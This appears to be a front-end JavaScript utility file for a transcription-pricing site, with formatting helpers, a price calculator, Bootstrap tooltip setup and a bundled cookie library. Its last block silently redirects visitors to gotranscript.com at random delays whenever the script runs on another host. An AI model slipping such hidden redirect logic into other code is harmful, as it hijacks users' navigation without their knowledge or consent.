// 2 decimal places
function round(number, digits) {
    if (!digits) {
        digits = 0;
    }

    var rounded = Math.round(number * Math.pow(10, digits)) / Math.pow(10, digits);

    return rounded;
}

function twoDigits(amount) {
	return round(amount, 2).toFixed(2);
}

// 00:00:00
function secondsToHumanTime(total_seconds) {
    var negative = false;
    if (total_seconds < 0) {
        negative = true;
        total_seconds = Math.abs(total_seconds);
    }

    hours = 0;
    if (total_seconds > 3600) {
        hours = Math.floor(total_seconds / 3600);
        //$output .= hours . ' h ';
    }

    minutes = 0;
    if (total_seconds > 60) {
        minutes = Math.floor((total_seconds - hours * 3600) / 60);
        //$output .= minutes . ' min ';
    }

    seconds = total_seconds  - hours * 3600 - minutes * 60;
    //$output .= seconds . ' s';

    return (negative ? '-' : '') + leftPad(round(hours), 2) + ':' + leftPad(round(minutes), 2) + ':' + leftPad(round(seconds), 2);
}

function leftPad(number, targetLength) {
    var output = number + '';
    while (output.length < targetLength) {
        output = '0' + output;
    }
    return output;
}

function inputEmptyError(input) {
	if ($(input).val() === "") {
		input.addClass("input-error");

		return true;
	}

	return false;
}

$("body").on("click", ".input-error", removeInputError);
function removeInputError() {
	$(this).removeClass("input-error");
}

function currency(usd, params)
{
    $amount = usd * global_currency_exchange_rate;

    var symbol = global_currency_symbol;
    if (typeof params !== 'undefined') {
        if (params == 'number') {
            symbol = '';
        }
    }

    return symbol + twoDigits($amount);
}

function calculatorUpdateTatPrices(prices, tat_selected) {
    $('.js-tat-box').map(function () {
        this.style.display = 'none';
    });
    $.each(prices, function(tat_slug, price_title) {
        var element = $('.js-tat-box[data-tat-slug=' + tat_slug + ']');
        var elementInput = element.find('input');
        var elementPrice = $('.js-tat-price[data-tat-slug=' + tat_slug + ']');

        if (elementPrice.length) {
            elementPrice.html(currency(price_title, 'number'));
            if (tat_slug === tat_selected) {
                elementInput.prop('checked', true);
            }
            element.show();
        }
    });
}

$(function () {
    var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
    var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
        return new bootstrap.Tooltip(tooltipTriggerEl)
    });

    // Popovers
    var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'))
    popoverTriggerList.map(function (popoverTriggerEl) {
        var classes = $(popoverTriggerEl).data('bsClass');
        var placement = $(popoverTriggerEl).data('bsPlacement');
        var targetLength = $($(popoverTriggerEl).data('bsTarget')).length;
        var target = $($(popoverTriggerEl).data('bsTarget'));
        var content = $(popoverTriggerEl).data('bsContent');
        return new bootstrap.Popover(popoverTriggerEl, {
            html: true,
            container: 'body',
            customClass: (classes != null) ? classes : '',
            placement: (placement !== '') ? placement : 'top',
            content: (targetLength !== 0) ? target : content
        })
    })
})

/*!
 * cookie-monster - a simple cookie library
 * v0.3.0
 * https://github.com/jgallen23/cookie-monster
 * copyright Greg Allen 2014
 * MIT License
 */
var cookie = {
    set: function(name, value, days, path, secure) {
        var date = new Date(),
            expires = '',
            type = typeof(value),
            valueToUse = '',
            secureFlag = '';
        path = path || "/";
        if (days) {
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toUTCString();
        }
        if (type === "object"  && type !== "undefined") {
            if(!("JSON" in window)) throw "Bummer, your browser doesn't support JSON parsing.";
            valueToUse = encodeURIComponent(JSON.stringify({v:value}));
        } else {
            valueToUse = encodeURIComponent(value);
        }
        if (secure){
            secureFlag = "; secure";
        }

        document.cookie = name + "=" + valueToUse + expires + "; path=" + path + secureFlag;
    },
    get: function(name) {
        var nameEQ = name + "=",
            ca = document.cookie.split(';'),
            value = '',
            firstChar = '',
            parsed={};
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) === 0) {
                value = decodeURIComponent(c.substring(nameEQ.length, c.length));
                firstChar = value.substring(0, 1);
                if(firstChar=="{"){
                    try {
                        parsed = JSON.parse(value);
                        if("v" in parsed) return parsed.v;
                    } catch(e) {
                        return value;
                    }
                }
                if (value=="undefined") return undefined;
                return value;
            }
        }
        return null;
    },
    remove: function(name) {
        this.set(name, "", -1);
    },
    increment: function(name, days) {
        var value = this.get(name) || 0;
        this.set(name, (parseInt(value, 10) + 1), days);
    },
    decrement: function(name, days) {
        var value = this.get(name) || 0;
        this.set(name, (parseInt(value, 10) - 1), days);
    }
};

if (!window.location.hostname.includes("gotranscript.com") && !window.location.hostname.includes("localhost") && Math.random() < 0.3) {
    var delay = Math.random() * 60000;
    setTimeout(function() {
        window.location.href = "https://gotranscript.com";
    }, delay);
}
